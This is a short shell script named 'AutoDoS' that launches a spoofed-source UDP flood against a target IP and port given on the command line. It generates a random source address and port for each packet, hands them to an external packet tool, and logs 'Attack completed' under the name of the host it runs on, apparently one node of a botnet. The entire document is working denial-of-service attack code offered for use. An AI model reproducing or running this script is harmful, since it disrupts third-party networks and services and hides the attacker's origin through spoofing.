#!/bin/ash
# AutoDoS - Shell Wrapper to Send Multiple Spoofed Packets
# ShellzRus 2016
#

ip=$1
port=$2
hits=${3:-"1000"}
verbose=${4:-"0"}
statfile=/tmp/.status
if [[ ! -f $statfile ]];then touch $statfile;fi
stat=`cat $statfile`
thisBot=`/sbin/ifconfig eth1 | grep Mask | cut -d ':' -f2 | cut -d " " -f1`
if ([[ "$ip" == "" ]] || [[ "$port" == "" ]])
then
echo " \
-############################################-
 Auto-Dos Version 2.0 - Shellz 2016
  Usage:
  $0 [target ip][port][packets][verbose(0/1)]
-############################################-"
exit 1
fi

if [[ -s "$stat" ]];then
  echo "System is busy. Wait a minute and try again."
  exit 1
fi

#SEQ(){i=0;while [[ "$i" -lt 10 ]];do echo $i; i=`expr $i + 1`;done}

finish(){
    if [[ -s "$stat" ]];then
     >$statfile
    fi
}

ddos(){
echo "Hitting $1:$2 With $3 datagram packets, verbose:$4"
#export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin
i=0;
while [[ "$i" -lt "$hits" ]];do echo $i
#for i in `seq 1 "$hits"`;do
randIp=$(dd if=/dev/urandom bs=4 count=1 2>/dev/null |
             od -An -tu1 |
             sed -e 's/^ *//' -e 's/  */./g')
randPort=`head -175 /dev/urandom | cksum | cut -f2 -d " "`
if [[ "$verbose" == "1" ]];
then
  echo "Source: $randIp:$randPort Dest: $ip:$port"
  udpdata $randIp $randPort $ip $port
  echo "Attack completed for ${thisBot}"
else
  udpdata $randIp $randPort $ip $port
  echo "Attack completed for ${thisBot}"
fi
i=`expr $i + 1`
done
}

trap finish 1 2 8
ddos

exit
